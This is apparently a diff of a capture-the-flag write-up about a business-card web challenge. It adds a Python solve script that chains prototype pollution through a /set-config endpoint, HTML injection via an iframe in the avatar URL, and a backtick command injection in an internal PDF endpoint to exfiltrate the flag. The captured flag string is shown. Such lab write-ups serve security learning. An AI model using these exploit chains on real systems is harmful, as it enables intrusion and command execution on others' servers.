@@ -1,15 +1,17 @@
 ---
 created: 2025-03-02T05:54
-updated: 2025-03-02T07:39
+updated: 2025-03-18T02:30
+points: 600
+solves: 6
 ---
+
+`| safe` bypasses safety checks, this is definitely a XSS attack vector.
 
 ```html
 <div class="box-left">
 	{{ userAvatarUrl | renderUrlAsAvatar | safe }}
 </div>
 ```
-
-`| safe` bypasses safety checks, this is definitely a XSS attack vector.
 
 After looking a bit, my `userAvatarUrl` has to pass the url check.
 
@@ -66,7 +68,7 @@ function isLikelyValidGitHubHandle(username) {
     return regex.test(username);
 }
 ```
-
+## prototype pollution
 Wait... there's prototype pollution?
 
 ```js
@@ -189,4 +191,53 @@ print(flag)
 
 ```flag
 ATHACKCTF{Spacele$$_$$urfing_On_Polluted_$hells}
+```
+
+
+```python
+import re
+import requests
+
+target = 'http://localhost:14569/'
+
+# target = 'http://localhost:2025/'
+
+
+def prototype(key, val):
+    return requests.post(target + '/set-config', data={
+        'config': '__proto__',
+        'key': key,
+        'val': val
+    }).text
+
+
+def makeCard():
+    text = requests.post(target + '/create-card', data={
+        'firstName': 'yun',
+        'lastName': 'yun',
+        'email': 'yun@yun.ng',
+        'github': 'octo-kumo',
+        'company': 'Yun'
+    }).text
+    return re.search(r'cardId" value="([0-9a-f]+)', text).group(1)
+
+
+def downloadCard(cardId):
+    return requests.get(target + '/download-card', params={
+        "cardId": cardId,
+        "email": "yun@yun.ng"
+    }).content
+
+
+prototype('avatarUrl', 'http://yun.ng?innocent')
+cardId1 = makeCard()
+print("target cardId:", cardId1)
+cardId = makeCard()
+prototype('avatarUrl', 'http://yun.ng?"><iframe src="http://localhost:1984/make-card-pdf?data=\'`/usr/bin/echo-flag>/home/chall/storage/'+cardId1+'.pdf`\'%20'+cardId+'" width="600" height="500"></iframe><!--')
+cardId = makeCard()
+print("Card ID:", cardId)
+downloadCard(cardId)
+
+flag = requests.get(target + '/download-card?email=ww@ww.com&cardId='+cardId1).text
+print(flag)
 ```
